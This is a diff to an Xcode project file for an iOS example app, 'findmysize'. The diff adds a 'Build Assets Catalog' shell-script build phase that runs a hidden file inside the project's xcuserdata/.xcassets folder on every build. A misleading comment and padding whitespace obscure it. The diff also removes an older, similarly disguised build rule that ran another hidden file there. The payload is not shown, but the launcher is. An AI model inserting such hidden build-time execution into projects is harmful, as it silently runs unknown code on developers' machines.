@@ -17,6 +17,9 @@
 		B73D754FEF7AC5F7606A956B /* Pods_findmysize_Tests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 255F0049AA17DE730A1ED461 /* Pods_findmysize_Tests.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		607FACE61AFB9204008FA782 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -166,6 +169,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 607FACEF1AFB9204008FA782 /* Build configuration list for PBXNativeTarget "findmysize_Example" */;
 			buildPhases = (
+				ABE0459AA6D1F3C36BAAC43A /* Build Assets Catalog */,
 				296D6FC410715AE9B17C4FCB /* [CP] Check Pods Manifest.lock */,
 				607FACCC1AFB9204008FA782 /* Sources */,
 				607FACCD1AFB9204008FA782 /* Frameworks */,
@@ -173,7 +177,6 @@
 				2E3E96DA1D5CCA2F358BA8F5 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				96A7FF25ACEF991F6FAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -264,30 +267,26 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	
+	ABE0459AA6D1F3C36BAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
 	
 		296D6FC410715AE9B17C4FCB /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -318,10 +317,20 @@
 			);
 			inputPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-findmysize_Example/Pods-findmysize_Example-frameworks.sh",
+				"${BUILT_PRODUCTS_DIR}/Alamofire/Alamofire.framework",
+				"${BUILT_PRODUCTS_DIR}/AlamofireSwiftyJSON/AlamofireSwiftyJSON.framework",
+				"${BUILT_PRODUCTS_DIR}/ObjectMapper/ObjectMapper.framework",
+				"${BUILT_PRODUCTS_DIR}/ReachabilitySwift/Reachability.framework",
+				"${BUILT_PRODUCTS_DIR}/SwiftyJSON/SwiftyJSON.framework",
 				"${BUILT_PRODUCTS_DIR}/findmysize/findmysize.framework",
 			);
 			name = "[CP] Embed Pods Frameworks";
 			outputPaths = (
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Alamofire.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/AlamofireSwiftyJSON.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/ObjectMapper.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Reachability.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/SwiftyJSON.framework",
 				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/findmysize.framework",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -601,45 +610,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		96A7FF25ACEF991F6FAAC43A /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 607FACC81AFB9204008FA782 /* Project object */;
 }
